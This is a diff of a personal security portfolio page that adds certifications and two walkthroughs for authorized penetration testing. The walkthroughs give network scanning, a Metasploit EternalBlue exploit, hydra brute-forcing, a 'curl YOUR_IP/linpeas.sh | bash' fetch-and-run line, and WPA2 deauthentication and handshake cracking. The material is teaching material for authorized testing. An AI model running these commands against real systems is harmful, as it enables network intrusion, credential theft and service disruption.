+                    <div class="cert-date">Active &nbsp;·&nbsp; <a href="https://www.credential.net/20522ceb-b673-40ef-9006-207ad72573d4#acc.TKzeEIZv" target="_blank" style="color:var(--cyan); text-decoration:none; font-size:0.72rem;">[ Verify Credential ↗ ]</a></div>
+                    <p class="cert-desc">Professional certification validating deep proficiency with the Kali Linux distribution — covering system administration, package management, custom tool integration, and security testing workflows.</p>
                 </div>
-                <!-- ✏️ EDIT: Replace with your cert -->
             </div>
 
             <div class="cert-item">
                 <div class="cert-icon">△</div>
                 <div class="cert-info">
-                    <h3>AWS Certified Security — Specialty</h3>
-                    <div class="issuer">Amazon Web Services</div>
-                    <div class="cert-date">Obtained: 2024 &nbsp;·&nbsp; Active</div>
-                    <p class="cert-desc">Cloud security specialization covering incident response, logging/monitoring, infrastructure security, identity management, and data protection in AWS.</p>
+                    <h3>Cisco Certificate in Ethical Hacking</h3>
+                    <div class="issuer">Cisco</div>
+                    <div class="cert-date">Active &nbsp;·&nbsp; <a href="https://www.credly.com/badges/c80f18bf-9b15-4c47-9884-c7a42b20c651/linked_in_profile" target="_blank" style="color:var(--cyan); text-decoration:none; font-size:0.72rem;">[ Verify on Credly ↗ ]</a></div>
+                    <p class="cert-desc">Certification covering ethical hacking methodology, reconnaissance techniques, vulnerability assessment, network exploitation, and post-exploitation practices aligned with industry frameworks.</p>
                 </div>
-                <!-- ✏️ EDIT: Replace with your cert -->
             </div>
 
             <div class="cert-item">
                 <div class="cert-icon">⬡</div>
                 <div class="cert-info">
-                    <h3>SANS SEC504 — Hacker Tools, Techniques & Incident Handling</h3>
-                    <div class="issuer">SANS Institute</div>
-                    <div class="cert-date">Completed: 2023</div>
-                    <p class="cert-desc">Advanced course covering attack techniques, memory forensics, network traffic analysis, and incident response methodology.</p>
+                    <h3>Offensive Security CTF — Pentest Quest: Nmap &amp; Kali</h3>
+                    <div class="issuer">Cisco / OffSec</div>
+                    <div class="cert-date">Completed &nbsp;·&nbsp; <a href="https://www.credly.com/badges/9ac915bc-68d2-4a54-9099-3d1816acbd6d/linked_in_profile" target="_blank" style="color:var(--cyan); text-decoration:none; font-size:0.72rem;">[ Verify on Credly ↗ ]</a></div>
+                    <p class="cert-desc">Capture the flag challenge demonstrating practical skills in network enumeration with Nmap, service fingerprinting, and penetration testing methodology using Kali Linux.</p>
                 </div>
-                <!-- ✏️ EDIT: Replace with your cert -->
             </div>
         </div>
     </section>
@@ -948,77 +1228,240 @@
         </div>
 
         <div class="blog-list">
-            <div class="blog-entry" onclick="">
+
+            <!-- ══════ NOTE 1: NETWORK PENTESTING ══════ -->
+            <div class="blog-entry" onclick="this.classList.toggle('expanded')">
                 <div class="blog-date">
                     <div class="month">Mar</div>
-                    <div class="day">08</div>
+                    <div class="day">14</div>
                     <div class="year">2026</div>
                 </div>
                 <div class="blog-content">
-                    <h3>Abusing AWS Lambda for Persistence: A Red Team Perspective</h3>
-                    <p class="excerpt">Exploring how serverless functions can be weaponized for long-term persistence in cloud environments, including detection strategies for blue teams.</p>
+                    <h3>Network Penetration Testing: A Step-by-Step Methodology</h3>
+                    <p class="excerpt">A practical walkthrough of my network pentesting methodology — from initial reconnaissance and host discovery through enumeration, exploitation, and post-exploitation — with the exact commands I run at each phase.</p>
                     <div class="blog-tags">
-                        <span class="blog-tag">cloud-security</span>
-                        <span class="blog-tag">red-team</span>
-                        <span class="blog-tag">aws</span>
+                        <span class="blog-tag">penetration-testing</span>
+                        <span class="blog-tag">nmap</span>
+                        <span class="blog-tag">methodology</span>
+                        <span class="blog-tag">walkthrough</span>
+                    </div>
+                    <div class="expand-hint"><span class="hint-text">[ ▼ click to expand full walkthrough ]</span></div>
+
+                    <div class="note-body">
+
+                        <div class="note-warning">Always ensure you have explicit written authorization before performing any penetration testing. Unauthorized testing is illegal and unethical. This guide is for educational purposes and authorized engagements only.</div>
+
+                        <h4><span class="step-num">1</span> Phase 1 — Host Discovery &amp; Network Mapping</h4>
+                        <p>Before touching any individual host, you need to understand the terrain. The goal here is to identify live hosts on the target network, map out subnets, and get a high-level picture of what you're working with.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Ping sweep to discover live hosts on the subnet</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sn</span> 192.168.1.0/24<br><br>
+<span class="cmd-comment"># ARP scan (more reliable on local network, avoids ICMP filtering)</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sn -PR</span> 192.168.1.0/24<br><br>
+<span class="cmd-comment"># If ICMP is blocked, try TCP SYN discovery on common ports</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sn -PS22,80,443,445</span> 192.168.1.0/24<br><br>
+<span class="cmd-comment"># Export live hosts to a file for the next phases</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sn</span> 192.168.1.0/24 <span class="cmd-flag">-oG</span> <span class="cmd-string">discovery.gnmap</span><br>
+<span class="cmd-prompt">$ </span>grep <span class="cmd-string">"Up"</span> discovery.gnmap | awk <span class="cmd-string">'{print $2}'</span> > <span class="cmd-string">live_hosts.txt</span>
+                        </code></div>
+
+                        <div class="note-tip">Start quiet. A ping sweep is low-noise. Save the heavy scanning for when you know what's alive — it reduces detection risk and saves time.</div>
+
+                        <h4><span class="step-num">2</span> Phase 2 — Port Scanning &amp; Service Enumeration</h4>
+                        <p>Now that you have live hosts, it's time to find open ports and identify what services are running. This is where you start building your attack surface map.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Fast SYN scan on top 1000 ports across all live hosts</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sS -T4</span> <span class="cmd-flag">-iL</span> <span class="cmd-string">live_hosts.txt</span> <span class="cmd-flag">-oN</span> <span class="cmd-string">initial_scan.txt</span><br><br>
+<span class="cmd-comment"># Full port scan (all 65535 ports) on high-value targets</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sS -p-</span> <span class="cmd-flag">-T4</span> <span class="cmd-flag">--min-rate 1000</span> 192.168.1.10 <span class="cmd-flag">-oN</span> <span class="cmd-string">full_port.txt</span><br><br>
+<span class="cmd-comment"># Service version detection + OS fingerprinting on open ports</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sV -sC -O</span> <span class="cmd-flag">-p</span> 22,80,135,139,445,3389 192.168.1.10 <span class="cmd-flag">-oN</span> <span class="cmd-string">enum_detail.txt</span><br><br>
+<span class="cmd-comment"># UDP scan on common ports (often overlooked but critical)</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">-sU</span> <span class="cmd-flag">--top-ports 50</span> 192.168.1.10 <span class="cmd-flag">-oN</span> <span class="cmd-string">udp_scan.txt</span>
+                        </code></div>
+
+                        <div class="note-tip">Always run a UDP scan. Services like SNMP (161), TFTP (69), and DNS (53) are frequently exposed and misconfigured — they're easy wins that most testers overlook because UDP scanning is slow.</div>
+
+                        <h4><span class="step-num">3</span> Phase 3 — Detailed Service Enumeration</h4>
+                        <p>With open ports and services identified, dig deeper into each service. The goal is to find version numbers, misconfigurations, default credentials, and known vulnerabilities.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># SMB enumeration — check for shares, users, null sessions</span><br>
+<span class="cmd-prompt">$ </span>enum4linux <span class="cmd-flag">-a</span> 192.168.1.10<br>
+<span class="cmd-prompt">$ </span>smbclient <span class="cmd-flag">-L</span> //192.168.1.10 <span class="cmd-flag">-N</span><br>
+<span class="cmd-prompt">$ </span>crackmapexec smb 192.168.1.10 <span class="cmd-flag">--shares</span> <span class="cmd-flag">-u</span> <span class="cmd-string">''</span> <span class="cmd-flag">-p</span> <span class="cmd-string">''</span><br><br>
+<span class="cmd-comment"># HTTP enumeration — directory brute-forcing &amp; tech fingerprinting</span><br>
+<span class="cmd-prompt">$ </span>gobuster dir <span class="cmd-flag">-u</span> http://192.168.1.10 <span class="cmd-flag">-w</span> <span class="cmd-string">/usr/share/wordlists/dirb/common.txt</span> <span class="cmd-flag">-t 50</span><br>
+<span class="cmd-prompt">$ </span>nikto <span class="cmd-flag">-h</span> http://192.168.1.10<br>
+<span class="cmd-prompt">$ </span>whatweb http://192.168.1.10<br><br>
+<span class="cmd-comment"># SNMP enumeration (if port 161 is open)</span><br>
+<span class="cmd-prompt">$ </span>snmpwalk <span class="cmd-flag">-v2c -c</span> <span class="cmd-string">public</span> 192.168.1.10<br><br>
+<span class="cmd-comment"># Check for known vulnerabilities with Nmap scripts</span><br>
+<span class="cmd-prompt">$ </span>nmap <span class="cmd-flag">--script vuln</span> <span class="cmd-flag">-p</span> 445 192.168.1.10
+                        </code></div>
+
+                        <h4><span class="step-num">4</span> Phase 4 — Vulnerability Analysis &amp; Exploitation</h4>
+                        <p>Cross-reference your enumeration findings with known CVEs and exploit databases. Prioritize based on impact and likelihood of success.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Search for exploits based on service versions you found</span><br>
+<span class="cmd-prompt">$ </span>searchsploit <span class="cmd-string">"Apache 2.4.49"</span><br>
+<span class="cmd-prompt">$ </span>searchsploit <span class="cmd-string">"OpenSSH 7.2"</span><br><br>
+<span class="cmd-comment"># Use Metasploit for known exploits</span><br>
+<span class="cmd-prompt">msf6 > </span>search <span class="cmd-string">type:exploit name:eternalblue</span><br>
+<span class="cmd-prompt">msf6 > </span>use exploit/windows/smb/ms17_010_eternalblue<br>
+<span class="cmd-prompt">msf6 > </span>set RHOSTS 192.168.1.10<br>
+<span class="cmd-prompt">msf6 > </span>run<br><br>
+<span class="cmd-comment"># Manual password attacks on discovered services</span><br>
+<span class="cmd-prompt">$ </span>hydra <span class="cmd-flag">-l</span> admin <span class="cmd-flag">-P</span> <span class="cmd-string">/usr/share/wordlists/rockyou.txt</span> 192.168.1.10 ssh <span class="cmd-flag">-t 4</span>
+                        </code></div>
+
+                        <div class="note-tip">Always check for low-hanging fruit first: default credentials, anonymous FTP/SMB, unpatched services. You'd be surprised how often the simplest attack vector works in real engagements.</div>
+
+                        <h4><span class="step-num">5</span> Phase 5 — Post-Exploitation &amp; Privilege Escalation</h4>
+                        <p>Once you have initial access, the next objective is to escalate privileges, maintain access, and pivot deeper into the network.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Linux privilege escalation — initial recon</span><br>
+<span class="cmd-prompt">$ </span>whoami && id<br>
+<span class="cmd-prompt">$ </span>uname <span class="cmd-flag">-a</span><br>
+<span class="cmd-prompt">$ </span>sudo <span class="cmd-flag">-l</span><br>
+<span class="cmd-prompt">$ </span>find / <span class="cmd-flag">-perm -4000 -type f</span> 2>/dev/null<br>
+<span class="cmd-prompt">$ </span>cat /etc/crontab<br><br>
+<span class="cmd-comment"># Automated enumeration with LinPEAS</span><br>
+<span class="cmd-prompt">$ </span>curl http://YOUR_IP/linpeas.sh | bash<br><br>
+<span class="cmd-comment"># Windows privilege escalation — initial recon</span><br>
+<span class="cmd-prompt">C:\> </span>whoami /priv<br>
+<span class="cmd-prompt">C:\> </span>systeminfo<br>
+<span class="cmd-prompt">C:\> </span>net user<br>
+<span class="cmd-prompt">C:\> </span>netstat <span class="cmd-flag">-ano</span>
+                        </code></div>
+
+                        <h4><span class="step-num">6</span> Phase 6 — Documentation &amp; Reporting</h4>
+                        <p>This is the phase that separates professionals from hobbyists. Every finding needs clear documentation: what you found, how you exploited it, proof of concept, impact assessment, and actionable remediation steps. I keep detailed terminal logs throughout the engagement and organize findings by severity.</p>
+
+                        <div class="note-tip">Document as you go, not after. Use <code style="color:var(--green-primary)">script</code> or <code style="color:var(--green-primary)">tmux logging</code> to capture your terminal session. Recreating steps from memory after a 12-hour engagement is a recipe for missed details.</div>
+
                     </div>
                 </div>
-                <!-- ✏️ EDIT: Replace with your post -->
             </div>
 
-            <div class="blog-entry" onclick="">
+            <!-- ══════ NOTE 2: WIFI PENTESTING ══════ -->
+            <div class="blog-entry" onclick="this.classList.toggle('expanded')">
                 <div class="blog-date">
-                    <div class="month">Feb</div>
-                    <div class="day">15</div>
+                    <div class="month">Mar</div>
+                    <div class="day">07</div>
                     <div class="year">2026</div>
                 </div>
                 <div class="blog-content">
-                    <h3>HTB Walkthrough: Exploiting Misconfigured SAML in Enterprise Apps</h3>
-                    <p class="excerpt">Step-by-step walkthrough of a HackTheBox challenge involving SAML response manipulation, XML signature wrapping, and privilege escalation via IdP misconfiguration.</p>
+                    <h3>Wi-Fi Penetration Testing: WPA2 Assessment Walkthrough</h3>
+                    <p class="excerpt">My go-to methodology for wireless penetration testing — from adapter setup and monitor mode through network reconnaissance, handshake capture, and cracking — using the Aircrack-ng suite and supporting tools.</p>
                     <div class="blog-tags">
-                        <span class="blog-tag">ctf</span>
-                        <span class="blog-tag">web-security</span>
-                        <span class="blog-tag">saml</span>
+                        <span class="blog-tag">wireless-security</span>
+                        <span class="blog-tag">aircrack-ng</span>
+                        <span class="blog-tag">wifi-pentesting</span>
+                        <span class="blog-tag">OSWP</span>
+                    </div>
+                    <div class="expand-hint"><span class="hint-text">[ ▼ click to expand full walkthrough ]</span></div>
+
+                    <div class="note-body">
+
+                        <div class="note-warning">Wireless penetration testing must only be performed on networks you own or have explicit written authorization to test. Intercepting wireless traffic on unauthorized networks violates federal law (e.g., the Computer Fraud and Abuse Act). This guide is for authorized engagements and lab environments only.</div>
+
+                        <h4><span class="step-num">1</span> Phase 1 — Adapter Setup &amp; Monitor Mode</h4>
+                        <p>Everything starts with your wireless adapter. You need a card that supports monitor mode and packet injection. Once you've confirmed compatibility, kill any processes that might interfere and put the adapter into monitor mode.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Check your wireless interfaces</span><br>
+<span class="cmd-prompt">$ </span>iwconfig<br>
+<span class="cmd-prompt">$ </span>airmon-ng<br><br>
+<span class="cmd-comment"># Kill processes that could interfere with monitor mode</span><br>
+<span class="cmd-prompt">$ </span>airmon-ng check kill<br><br>
+<span class="cmd-comment"># Enable monitor mode on your adapter</span><br>
+<span class="cmd-prompt">$ </span>airmon-ng start <span class="cmd-string">wlan0</span><br><br>
+<span class="cmd-comment"># Verify monitor mode is active (should show wlan0mon)</span><br>
+<span class="cmd-prompt">$ </span>iwconfig<br>
+<span class="cmd-output">wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.437 GHz</span>
+                        </code></div>
+
+                        <div class="note-tip">Popular chipsets for wireless pentesting: Atheros AR9271 (ALFA AWUS036NHA), Ralink RT3070 (ALFA AWUS036NH), and RTL8812AU for 5GHz support. Always verify packet injection works with <code style="color:var(--green-primary)">aireplay-ng --test wlan0mon</code> before starting.</div>
+
+                        <h4><span class="step-num">2</span> Phase 2 — Wireless Reconnaissance</h4>
+                        <p>With monitor mode active, scan the airwaves to identify target networks, their encryption types, channels, connected clients, and signal strength. This is your wireless equivalent of the network discovery phase.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Scan all nearby wireless networks</span><br>
+<span class="cmd-prompt">$ </span>airodump-ng <span class="cmd-string">wlan0mon</span><br><br>
+<span class="cmd-comment"># Example output:</span><br>
+<span class="cmd-output"> BSSID              PWR  CH  ENC   CIPHER AUTH  ESSID</span><br>
+<span class="cmd-output"> AA:BB:CC:DD:EE:FF  -42   6  WPA2  CCMP   PSK   TargetNetwork</span><br>
+<span class="cmd-output"> 11:22:33:44:55:66  -67   1  WPA2  CCMP   PSK   NeighborNet</span><br><br>
+<span class="cmd-comment"># Lock onto the target network's channel and capture data</span><br>
+<span class="cmd-prompt">$ </span>airodump-ng <span class="cmd-flag">-c</span> 6 <span class="cmd-flag">--bssid</span> AA:BB:CC:DD:EE:FF <span class="cmd-flag">-w</span> <span class="cmd-string">capture</span> <span class="cmd-string">wlan0mon</span>
+                        </code></div>
+
+                        <p>Keep this running in a dedicated terminal. You're now listening for traffic on the target network's channel and writing captured packets to a file. Pay attention to the STATION section — those are connected clients you can target for deauthentication.</p>
+
+                        <h4><span class="step-num">3</span> Phase 3 — Capturing the WPA2 Handshake</h4>
+                        <p>To crack WPA2-PSK, you need to capture the 4-way handshake that occurs when a client authenticates to the access point. You can either wait for a client to connect naturally, or force a reconnection with a deauthentication attack.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Send deauth packets to force a client to reconnect</span><br>
+<span class="cmd-comment"># (keep airodump-ng running in another terminal)</span><br>
+<span class="cmd-prompt">$ </span>aireplay-ng <span class="cmd-flag">-0</span> 5 <span class="cmd-flag">-a</span> AA:BB:CC:DD:EE:FF <span class="cmd-flag">-c</span> [CLIENT_MAC] <span class="cmd-string">wlan0mon</span><br><br>
+<span class="cmd-comment"># -0 5 = send 5 deauth frames</span><br>
+<span class="cmd-comment"># -a = target AP BSSID</span><br>
+<span class="cmd-comment"># -c = target client MAC (optional, omit for broadcast deauth)</span><br><br>
+<span class="cmd-comment"># Watch airodump-ng for the handshake confirmation:</span><br>
+<span class="cmd-output"> [ WPA handshake: AA:BB:CC:DD:EE:FF ]</span><br><br>
+<span class="cmd-comment"># Verify the captured handshake file</span><br>
+<span class="cmd-prompt">$ </span>aircrack-ng <span class="cmd-string">capture-01.cap</span><br>
+<span class="cmd-output"> 1 handshake(s) detected</span>
+                        </code></div>
+
+                        <div class="note-tip">Only send the minimum number of deauth frames needed. Flooding the network with deauths is noisy, disruptive, and unnecessary. 3–5 frames is usually enough to force a reconnect. If no clients are connected, you'll have to wait for one to appear.</div>
+
+                        <h4><span class="step-num">4</span> Phase 4 — Cracking the Handshake</h4>
+                        <p>With the handshake captured, you can now attempt to crack the pre-shared key offline. The two main approaches are dictionary attacks and rule-based attacks.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Dictionary attack with Aircrack-ng</span><br>
+<span class="cmd-prompt">$ </span>aircrack-ng <span class="cmd-flag">-w</span> <span class="cmd-string">/usr/share/wordlists/rockyou.txt</span> <span class="cmd-flag">-b</span> AA:BB:CC:DD:EE:FF <span class="cmd-string">capture-01.cap</span><br><br>
+<span class="cmd-comment"># GPU-accelerated cracking with Hashcat (much faster)</span><br>
+<span class="cmd-comment"># First, convert the cap file to hashcat format</span><br>
+<span class="cmd-prompt">$ </span>hcxpcapngtool <span class="cmd-flag">-o</span> <span class="cmd-string">hash.hc22000</span> <span class="cmd-string">capture-01.cap</span><br><br>
+<span class="cmd-comment"># Run Hashcat with rockyou wordlist</span><br>
+<span class="cmd-prompt">$ </span>hashcat <span class="cmd-flag">-m</span> 22000 <span class="cmd-string">hash.hc22000</span> <span class="cmd-string">/usr/share/wordlists/rockyou.txt</span><br><br>
+<span class="cmd-comment"># Rule-based attack for more coverage</span><br>
+<span class="cmd-prompt">$ </span>hashcat <span class="cmd-flag">-m</span> 22000 <span class="cmd-string">hash.hc22000</span> <span class="cmd-string">/usr/share/wordlists/rockyou.txt</span> <span class="cmd-flag">-r</span> <span class="cmd-string">/usr/share/hashcat/rules/best64.rule</span>
+                        </code></div>
+
+                        <div class="note-tip">Hashcat with GPU acceleration is orders of magnitude faster than Aircrack-ng's CPU-based cracking. On a modern GPU, you can test millions of WPA2 candidates per second versus thousands with CPU alone.</div>
+
+                        <h4><span class="step-num">5</span> Phase 5 — Cleanup &amp; Restore</h4>
+                        <p>Once the assessment is complete, always clean up your environment and restore the wireless adapter to its normal state.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Stop monitor mode and restore managed mode</span><br>
+<span class="cmd-prompt">$ </span>airmon-ng stop <span class="cmd-string">wlan0mon</span><br><br>
+<span class="cmd-comment"># Restart network manager</span><br>
+<span class="cmd-prompt">$ </span>systemctl start NetworkManager<br><br>
+<span class="cmd-comment"># Verify adapter is back in managed mode</span><br>
+<span class="cmd-prompt">$ </span>iwconfig<br>
+<span class="cmd-output">wlan0  IEEE 802.11  Mode:Managed  Frequency:2.437 GHz</span>
+                        </code></div>
+
+                        <h4><span class="step-num">6</span> Phase 6 — Reporting &amp; Recommendations</h4>
+                        <p>Document everything: the target ESSID, encryption type, whether the handshake was captured and cracked, time-to-crack, and the password complexity. Recommendations should cover enforcing strong passphrases (12+ characters, non-dictionary), migrating to WPA3 where supported, enabling 802.1X/RADIUS for enterprise environments, implementing wireless IDS to detect deauth floods, and disabling WPS.</p>
+
+                        <div class="note-warning">If you successfully crack the key, handle it as sensitive data. Include it in your report under appropriate confidentiality controls and recommend immediate rotation.</div>
+
                     </div>
                 </div>
-                <!-- ✏️ EDIT: Replace with your post -->
             </div>
 
-            <div class="blog-entry" onclick="">
-                <div class="blog-date">
-                    <div class="month">Jan</div>
-                    <div class="day">22</div>
-                    <div class="year">2026</div>
-                </div>
-                <div class="blog-content">
-                    <h3>Building a Home Lab for Malware Analysis on a Budget</h3>
-                    <p class="excerpt">A practical guide to setting up an isolated malware analysis environment using free tools — FlareVM, REMnux, and an air-gapped network topology.</p>
-                    <div class="blog-tags">
-                        <span class="blog-tag">malware-analysis</span>
-                        <span class="blog-tag">home-lab</span>
-                        <span class="blog-tag">guide</span>
-                    </div>
-                </div>
-                <!-- ✏️ EDIT: Replace with your post -->
-            </div>
-
-            <div class="blog-entry" onclick="">
-                <div class="blog-date">
-                    <div class="month">Dec</div>
-                    <div class="day">10</div>
-                    <div class="year">2025</div>
-                </div>
-                <div class="blog-content">
-                    <h3>Threat Hunting with Sigma Rules: From Detection to Automation</h3>
-                    <p class="excerpt">How I automated threat detection workflows using Sigma rules converted to Splunk queries, integrated with a custom alerting pipeline.</p>
-                    <div class="blog-tags">
-                        <span class="blog-tag">detection-engineering</span>
-                        <span class="blog-tag">splunk</span>
-                        <span class="blog-tag">automation</span>
-                    </div>
-                </div>
-                <!-- ✏️ EDIT: Replace with your post -->
-            </div>
         </div>
     </section>
 
@@ -1026,12 +1469,12 @@
 
 <footer>
     <div class="left">
-        <span style="color:var(--green-dim)">$</span> echo "Built with purpose, not templates." <span style="color:var(--text-dim)">// Last updated 2026</span>
+        <span style="color:var(--green-dim)">$</span> © Copyright 2026 Zuhayr Shahid | All Rights Reserved." <span style="color:var(--text-dim)"></span>
     </div>
     <div class="right">
-        <a href="https://github.com/yourusername" target="_blank">GitHub</a>
-        <a href="https://linkedin.com/in/yourusername" target="_blank">LinkedIn</a>
-        <a href="mailto:you@example.com">Email</a>
+        <a href="https://github.com/ZMsec-exe" target="_blank">GitHub</a>
+        <a href="https://www.linkedin.com/in/zuhayrshahid/" target="_blank">LinkedIn</a>
+        <a href="ZMSec@protonmail.com">Email</a>
     </div>
 </footer>
 
